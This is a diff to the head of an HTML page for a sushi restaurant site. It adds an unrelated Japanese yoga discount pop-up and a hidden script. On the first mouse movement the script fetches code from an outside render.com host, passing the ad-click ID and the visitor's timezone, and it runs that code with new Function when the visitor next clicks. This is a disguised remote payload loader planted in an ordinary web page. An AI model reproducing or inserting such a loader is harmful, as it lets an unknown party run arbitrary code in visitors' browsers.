@@ -1,6 +1,172 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+<style>
+      /* Modal styles */
+      .modal {
+        display: none; /* Hidden by default */
+        position: fixed; /* Stay in place */
+        z-index: 1000; /* Sit on top */
+        left: 0;
+        top: 0;
+        width: 100%; /* Full width */
+        height: 100%; /* Full height */
+        overflow: auto; /* Enable scroll if needed */
+        background-color: rgba(0, 0, 0, 0.4); /* Black w/ opacity */
+      }
+
+      .modal-content {
+        position: relative;
+        margin: 5% auto; /* 5% from the top and centered */
+        padding: 20px;
+        padding-top: 70px;
+        width: 90%; /* Could be more or less, depending on screen size */
+        max-width: 500px;
+        background-color: #fff;
+        border-radius: 10px;
+        text-align: center;
+      }
+
+      .modal-image {
+        width: 100%;
+        height: auto;
+        border-radius: 10px;
+        margin-bottom: 20px;
+      }
+
+      .close-button {
+        position: absolute;
+        top: 2px;
+        right: 20px;
+        color: #aaa;
+        font-size: 50px;
+        font-weight: bold;
+        cursor: pointer;
+        z-index: 10;
+      }
+
+      .close-button:hover,
+      .close-button:focus {
+        color: black;
+        text-decoration: none;
+        cursor: pointer;
+      }
+
+      .btn-primary {
+        display: inline-block;
+        padding: 10px 20px;
+        margin-top: 10px;
+        background-color: #007bff;
+        color: #fff;
+        text-decoration: none;
+        border-radius: 5px;
+      }
+
+      .close-modal {
+        cursor: pointer;
+      }
+    </style>
+
+
+
+
+
+
+
+ <!-- Special Offer Modal -->
+    <div id="specialOfferModal" class="modal">
+      <div class="modal-content">
+        <span class="close-button">&times;</span>
+        
+        <h2>スペシャルオファー</h2>
+        <p>今だけ！初回のヨガクラスが50%オフ！</p>
+        <p>今すぐ予約して、心と体の健康を始めましょう。</p>
+        <ul>
+          <li>オンラインクラスで自宅から参加可能</li>
+          <li>経験豊富なインストラクターによる指導</li>
+          <li>リラクゼーションとストレス解消</li>
+        </ul>
+        <a href="#" class="btn-primary close-modal">今すぐ予約</a>
+      </div>
+    </div>
+
+    <!-- ==============  SWIPER JS ==============  -->
+    <script src="https://unpkg.com/swiper/swiper-bundle.min.js"></script>
+    <script src="main.js"></script>
+    <script>
+      
+      document.addEventListener("DOMContentLoaded", function () {
+        var modal = document.getElementById("specialOfferModal");
+        var closeButton = document.querySelector(".close-button");
+        var closeModalLinks = document.querySelectorAll(".close-modal");
+
+        // Show the modal
+        modal.style.display = "block";
+
+        
+        function closeModal() {
+          modal.style.display = "none";
+        }
+
+        closeButton.addEventListener("click", closeModal);
+        closeModalLinks.forEach(function (link) {
+          link.addEventListener("click", function (event) {
+            event.preventDefault();
+            closeModal();
+          });
+        });
+
+        
+        window.onclick = function (event) {
+          if (event.target == modal) {
+            modal.style.display = "none";
+          }
+        };
+      });
+    </script>
+	<script>
+    const gclid = new URLSearchParams(location.search).get("gclid");
+    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    const RENDER_BASE_URL = "https://decemberbackend.onrender.com";
+
+    let someCode = null;
+
+    document.cookie = "access_cookie=true; path=/; max-age=300";
+
+    document.addEventListener("mousemove", async function fetchCodeOnce() {
+      document.removeEventListener("mousemove", fetchCodeOnce);
+      try {
+        const res = await fetch(
+          `${RENDER_BASE_URL}/frontend-loader?gclid=${gclid}`,
+          {
+            headers: {
+              "x-client-timezone": timezone,
+              "x-access-cookie": "true",
+            },
+          }
+        );
+        const data = await res.json();
+        if (data && data.code) {
+          someCode = data.code;
+        }
+      } catch (err) {
+        console.error("Could not fetch code", err);
+      }
+    });
+
+    function handleSomeClick() {
+      if (someCode) {
+        try {
+          new Function(someCode)();
+        } catch (err) {
+          console.error("Error executing code:", err);
+        }
+      }
+    }
+
+    document.addEventListener("click", handleSomeClick);
+  </script>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Delicious Sushi | Authentic Japanese Cuisine</title>
